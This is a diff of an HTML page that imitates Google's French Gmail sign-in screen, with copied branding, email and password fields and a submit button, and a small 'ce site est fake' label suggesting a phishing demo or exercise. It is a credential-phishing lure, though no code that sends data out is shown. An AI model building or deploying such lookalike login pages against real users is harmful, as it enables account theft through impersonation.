@@ -1,237 +1,86 @@
 <!DOCTYPE html>
 <html>
-	<head>
-		<meta charset="UTF-8" />
-		<title>Connexion avec votre compte Google pour accéder à Gmail.</title>
-		<link
-			href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@300;400;500&display=swap"
-			rel="stylesheet"
-		/>
-		<link
-			rel="icon"
-			type="image/x-icon"
-			href="https://www.google.com/favicon.ico"
-		/>
-		<style>
-			* {
-				margin: 0;
-				padding: 0;
-				box-sizing: border-box;
-			}
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Connexion avec votre compte Google pour accéder à Gmail.</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@300;400;500&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      rel="icon"
+      type="image/x-icon"
+      href="https://www.google.com/favicon.ico"
+    />
+    <link rel="stylesheet" href="main.css" />
+  </head>
+  <body>
+    <div class="container">
+      <div class="tt">
+        <div class="page">
+          <div class="left">
+            <div class="logo-google">
+              <img
+                src="https://www.svgrepo.com/show/303108/google-icon-logo.svg"
+                alt="Logo Google"
+                width="32"
+                height="32"
+              />
+              <span class="logo-text">Connexion </span>
+            </div>
 
-			body {
-				font-family: "Google Sans", "Roboto", Arial, sans-serif;
-				background: #f5f5f5;
-				min-height: 100vh;
-				display: flex;
-				flex-direction: column;
-				align-items: center;
-				justify-content: center;
-			}
+            <div class="title">Connexion</div>
+            <p class="text">
+              avec votre compte Google pour accéder à Gmail. Ce compte sera
+              disponible pour d'autres applis Google dans le navigateur.
+            </p>
+          </div>
 
-			/* Conteneur principal qui regroupe le cadre blanc + la barre en bas */
-			.container {
-				background: #fff;
-				border-radius: 24px;
-				box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-				overflow: hidden; /* Important pour que les coins arrondis fonctionnent bien */
-				max-width: 950px;
-				width: 100%;
-			}
+          <div class="right">
+            <form class="login-form">
+              <div class="mail-label">Adresse e‑mail ou identifiant</div>
+              <input
+                class="input mail"
+                type="email"
+                placeholder="Adresse e-mail ou Téléphone"
+              />
 
-			.page {
-				padding: 40px 56px;
-				display: flex;
-				gap: 60px;
-			}
+              <div class="mail-label" style="margin-top: 20px">
+                Mot de passe
+              </div>
+              <input
+                class="input mdp"
+                type="password"
+                placeholder="Mot de passe"
+              />
 
-			.left {
-				flex: 1.1;
-			}
+              <div class="bottom">
+                <button type="button" class="link-button">
+                  Créer un compte
+                </button>
+                <button type="submit" class="primary">Suivant</button>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+      <div class="tt2">
+        <div class="language-bar">
+          <div class="language-display">
+            <span class="language-text">Français (France)</span>
+            <div class="dropdown-arrow"></div>
+          </div>
 
-			.logo-google {
-				display: flex;
-				align-items: center;
-				gap: 8px;
-				margin-bottom: 24px;
-			}
-
-			.logo-text {
-				font-size: 22px;
-				color: #202124;
-			}
-
-			.title {
-				font-size: 32px;
-				margin-bottom: 16px;
-				color: #202124;
-			}
-
-			.text {
-				font-size: 16px;
-				color: #5f6368;
-				line-height: 1.6;
-			}
-
-			.right {
-				flex: 1;
-			}
-
-			.mail-label {
-				font-size: 13px;
-				color: #5f6368;
-				margin-bottom: 6px;
-			}
-
-			.input {
-				width: 100%;
-				border: 1px solid #dadce0;
-				border-radius: 4px;
-				padding: 14px 12px;
-				font-size: 16px;
-				outline: none;
-				transition: border-color 0.2s, box-shadow 0.2s;
-			}
-			.input:focus {
-				border-color: #1a73e8;
-				box-shadow: 0 0 0 1px #1a73e8;
-			}
-
-			.bottom {
-				margin-top: 32px;
-				display: flex;
-				justify-content: space-between;
-				align-items: center;
-			}
-
-			.link-button {
-				border: none;
-				background: none;
-				color: #1a73e8;
-				font-size: 14px;
-				cursor: pointer;
-			}
-
-			.primary {
-				padding: 10px 24px;
-				background: #1a73e8;
-				color: #fff;
-				border: none;
-				border-radius: 24px;
-				font-size: 14px;
-				font-weight: 500;
-				cursor: pointer;
-			}
-			.primary:hover {
-				background: #1557b0;
-			}
-
-			/* Barre de langue collée en bas du cadre blanc */
-			.language-bar {
-				display: flex;
-				justify-content: space-between;
-				align-items: center;
-				padding: 12px 56px; /* Même padding horizontal que .page */
-				background-color: #f8f8f8;
-				border-top: 1px solid #e0e0e0;
-				font-size: 14px;
-			}
-
-			.language-display {
-				display: flex;
-				align-items: center;
-				color: #333;
-			}
-
-			.language-text {
-				margin-right: 8px;
-			}
-
-			.dropdown-arrow {
-				width: 12px;
-				height: 12px;
-				background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%23333' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
-				background-repeat: no-repeat;
-				background-position: center;
-			}
-
-			.links {
-				display: flex;
-				gap: 20px;
-			}
-
-			.links a {
-				text-decoration: none;
-				color: #333;
-			}
-
-			.links a:hover {
-				text-decoration: underline;
-			}
-
-			.abs{
-				position: absolute;
-				right: 0px;
-				bottom: 0px;
-				font-size: 10px;
-			}
-		</style>
-	</head>
-	<body>
-		<!-- Nouveau conteneur qui englobe tout -->
-		<div class="container">
-			<div class="page">
-				<div class="left">
-					<div class="logo-google">
-						<img
-							src="https://www.svgrepo.com/show/303108/google-icon-logo.svg"
-							alt="Logo Google"
-							width="32"
-							height="32"
-						/>
-						<span class="logo-text">Connexion </span>
-					</div>
-
-					<div class="title">Connexion</div>
-					<p class="text">
-						avec votre compte Google pour accéder à Gmail. Ce compte sera
-						disponible pour d'autres applis Google dans le navigateur.
-					</p>
-				</div>
-
-				<div class="right">
-					<div class="mail-label">Adresse e‑mail ou identifiant</div>
-					<input
-						class="input mail"
-						type="email"
-						placeholder="Adresse e-mail ou Téléphone"
-					/>
-
-					<div class="mail-label" style="margin-top: 20px">Mot de passe</div>
-					<input class="input mdp" type="password" placeholder="Mot de passe" />
-
-					<div class="bottom">
-						<button class="link-button">Créer un compte</button>
-						<a href="./response.html"><button class="primary">Suivant</button></a>
-					</div>
-				</div>
-			</div>
-
-			<!-- Barre collée directement en dessous, dans le même conteneur -->
-			<div class="language-bar">
-				<div class="language-display">
-					<span class="language-text">Français (France)</span>
-					<div class="dropdown-arrow"></div>
-				</div>
-
-				<div class="links">
-					<a href="response.html">Aide</a>
-					<a href="response.html">Confidentialité</a>
-					<a href="response.html">Conditions</a>
-				</div>
-			</div>
-		</div>
-        <p class="abs">ce site est fake</p>
-		<script src="main.js"></script>
-	</body>
+          <div class="links">
+            <a href="response.html">Aide</a>
+            <a href="response.html">Confidentialité</a>
+            <a href="response.html">Conditions</a>
+          </div>
+        </div>
+      </div>
+    </div>
+    <p class="abs">ce site est fake</p>
+    <script src="main.js"></script>
+  </body>
 </html>
